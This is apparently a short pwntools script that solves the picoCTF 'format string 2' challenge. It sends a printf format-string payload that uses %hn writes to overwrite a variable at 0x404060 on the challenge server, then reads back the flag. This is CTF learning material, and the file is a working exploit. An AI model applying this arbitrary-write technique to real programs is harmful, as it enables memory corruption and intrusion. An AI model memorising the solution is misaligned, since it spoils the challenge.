# picoCTF-format-string-2-exploit.py
# by Aidan Wech (ahwech)
# nc rhea.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "rhea.picoctf.net"
    port = 55487

    # variables
    new_sus_short_3 = 0x6761
    new_sus_short_4 = 0x6c66 - new_sus_short_3
    format_addr_1 = 0x404062
    format_addr_2 = 0x404060
    format_addr_1_location = 18
    format_addr_2_location = format_addr_1_location + 1
    payload = flat(
        {
            0: f"%{new_sus_short_3}x%{format_addr_1_location}$hn%{new_sus_short_4}x%{format_addr_2_location}$hn",
            32: p64(format_addr_1)
        },
        p64(format_addr_2)
    )

    # connect to instance and deliver payload
    p = remote(host, port)
    p.recvline(timeout=1)
    p.sendline(payload)
    p.recvuntil(b"go...\n", timeout=1)
    flag = p.recv(timeout=1).decode()
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()